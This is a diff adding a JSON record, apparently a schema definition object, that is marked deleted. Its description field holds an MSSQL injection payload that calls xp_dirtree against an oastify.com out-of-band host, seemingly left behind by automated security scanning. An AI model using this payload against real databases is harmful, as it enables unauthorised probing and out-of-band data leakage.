@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334436232,
+	"deleted":true,
+	"description":"SZHLUr;declare @q varchar(99);set @q='\\\\uwu1z811x4cupcmv8t1vjg5c73dw1xpofc7zynn.oasti'+'fy.com\\wic'; exec master.dbo.xp_dirtree @q;-- ",
+	"id":"67caa7a48780f31288255212",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"qvfspo",
+	"modifiedTime":1741358659979,
+	"name":"QvfSPO",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
